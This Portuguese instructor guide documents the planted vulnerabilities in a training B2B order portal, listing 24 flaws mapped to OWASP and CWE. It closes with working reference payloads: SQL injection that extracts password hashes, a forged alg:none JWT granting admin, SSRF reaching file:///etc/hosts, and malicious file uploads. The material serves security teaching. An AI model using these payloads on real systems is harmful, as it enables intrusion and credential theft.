# Vulnerabilidades plantadas — Portal de Pedidos B2B (baseline)

Este documento é para **instrutores**. Lista as falhas inseridas propositalmente
no estado `aula-1-baseline`, mapeadas para **OWASP Top 10 (2021)** e **CWE**, com o
local no código e a aula/lab em que cada uma é corrigida.

> ⚠️ Aplicação de treinamento. Não expor na internet, não usar dados reais.

| # | OWASP 2021 | CWE | Vulnerabilidade | Local no código | Corrigida em |
|---|------------|-----|-----------------|-----------------|--------------|
| 1 | A01 Broken Access Control | CWE-639 (IDOR) | Consulta de pedido sem checagem de posse (web e API) | `service/PedidoService.porId`, `controller/PedidoController.ver`, `api/PedidoApiController.porId` | Lab 3.2 |
| 2 | A01 Broken Access Control | CWE-284 | `/admin/**` exige apenas `authenticated`, não `ROLE_ADMIN` | `config/SecurityConfig` | Lab 3.5 |
| 3 | A02 Cryptographic Failures | CWE-327 / CWE-916 | Senha em MD5 sem salt | `service/UsuarioService.hash`, `security/Md5PasswordEncoder` | Lab 3.3 |
| 4 | A02 Cryptographic Failures | CWE-311 | "Proteção" de dados de pagamento com Base64 (não é cripto) | `service/CryptoService` | Lab 4.1 |
| 5 | A02 Cryptographic Failures | CWE-321 / CWE-798 | Segredo do JWT fraco e hardcoded | `application.yml`, `security/JwtService` | Lab 4.2 |
| 6 | A03 Injection | CWE-89 | SQL Injection na busca de produtos (concatenação) | `service/ProdutoService.buscar` | Lab 2.2 |
| 7 | A03 Injection | CWE-434 | Upload irrestrito (extensão/tipo/tamanho) + path traversal no nome | `service/UploadService` | Lab 2.4 |
| 8 | A04 Insecure Design | CWE-799 | Sem rate limiting no login (web e API) | `config/SecurityConfig`, `api/AuthApiController` | Lab 3.4 |
| 9 | A04 Insecure Design | CWE-20 | Ausência de Bean Validation nos DTOs | `dto/CadastroClienteForm`, `controller/HomeController` | Lab 2.3 |
| 10 | A05 Security Misconfiguration | CWE-16 | Actuator totalmente exposto sem auth | `application.yml` (`management.*`) | Lab 6.1 |
| 11 | A05 Security Misconfiguration | CWE-16 | H2 console habilitado e acessível | `application.yml` (`spring.h2.console`) | Lab 6.1 |
| 12 | A05 Security Misconfiguration | CWE-209 | Stack trace / mensagem de exceção retornados ao cliente | `application.yml` (`server.error.*`) | Lab 5.1 |
| 13 | A06 Vulnerable Components | CWE-1104 | `commons-text` 1.9 (CVE-2022-42889 "Text4Shell") | `pom.xml` | Lab 6.2 |
| 14 | A07 Auth Failures | CWE-307 | Sem proteção contra brute force no login | `config/SecurityConfig` | Lab 3.4 |
| 15 | A07 Auth Failures | CWE-204 | User enumeration no "esqueci minha senha" | `service/UsuarioService.recuperarSenha` | Aula 3 (teoria) / Lab 3.4 |
| 16 | A07 Auth Failures | CWE-521 | Sem política de senha (aceita "123") | `service/UsuarioService.registrar` | Lab 3.4 |
| 17 | A07 Auth Failures | CWE-347 | JWT sem verificação de assinatura (aceita `alg:none`/forjado) | `security/JwtService.lerClaimsSemVerificar` | Lab 4.2 |
| 18 | Session Mgmt | CWE-384 | Session fixation habilitada (`.sessionFixation().none()`) | `config/SecurityConfig` | Lab 4.3 |
| 19 | Session Mgmt | CWE-1004 / CWE-614 | Cookie de sessão sem HttpOnly/Secure/SameSite | `application.yml` (`server.servlet.session.cookie`) | Lab 4.3 |
| 20 | Session Mgmt | CWE-352 | CSRF desabilitado globalmente | `config/SecurityConfig` | Lab 4.4 |
| 21 | A08 Software/Data Integrity | CWE-829 | Sem verificação de dependências / SBOM no build | `pom.xml` / CI | Lab 6.2 / 6.4 |
| 22 | A09 Logging Failures | CWE-117 | Log injection (URL do usuário logada sem sanitizar) | `controller/ImportController` | Lab 5.1 |
| 23 | A09 Logging Failures | CWE-778 | Ausência de logging de eventos de segurança | (geral) | Lab 5.1 |
| 24 | A10 SSRF | CWE-918 | Importar catálogo busca qualquer URL informada | `service/CatalogoImportService` | Aula 2 (design) / discutida na Aula 5 |

## Payloads de referência (para o instrutor)

**SQL Injection (A03) — extrai e-mails e hashes MD5 via busca de produto:**
```
/produtos/buscar?termo=zzz' UNION SELECT id, email, senha, 0, 0 FROM usuario --
```
Tautologia (retorna todos os produtos): `termo=' OR '1'='1`

**IDOR (A01) — web:** logado como `joao@acme.com`, acessar `/pedidos/2` (pedido da Globex).
**IDOR (A01) — API:**
```
TOKEN=$(curl -s -X POST localhost:8080/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"joao@acme.com","senha":"senha123"}' | jq -r .token)
curl localhost:8080/api/pedidos/2 -H "Authorization: Bearer $TOKEN"
```

**JWT forjado (A02/A07) — escalada de privilégio** (o baseline não verifica assinatura):
```
# header {"alg":"none"} . payload {"sub":"joao@acme.com","role":"ROLE_ADMIN"} . (sem assinatura)
H=$(printf '{"alg":"none"}' | base64 | tr '+/' '-_' | tr -d '=')
P=$(printf '{"sub":"joao@acme.com","role":"ROLE_ADMIN"}' | base64 | tr '+/' '-_' | tr -d '=')
curl localhost:8080/api/pedidos -H "Authorization: Bearer $H.$P."
```

**Broken Access Control (A01):** qualquer usuário logado abre `/admin`.
**User enumeration (A07):** comparar respostas de `/esqueci-senha` para e-mail existente vs. inexistente.
**Misconfiguration (A05):** `GET /actuator/env`, `GET /actuator/mappings`, `/h2-console`.
**Dado sensível (A02):** `/admin` revela dados de pagamento (Base64) e hashes MD5.
**SSRF (A10):** `/importar-catalogo` com `url=http://localhost:8080/actuator/env` ou `file:///etc/hosts`.
**Upload irrestrito (A03/A04):** enviar `.jsp`/`.sh` em `/pedidos/{id}/comprovante`; nome com `../`.
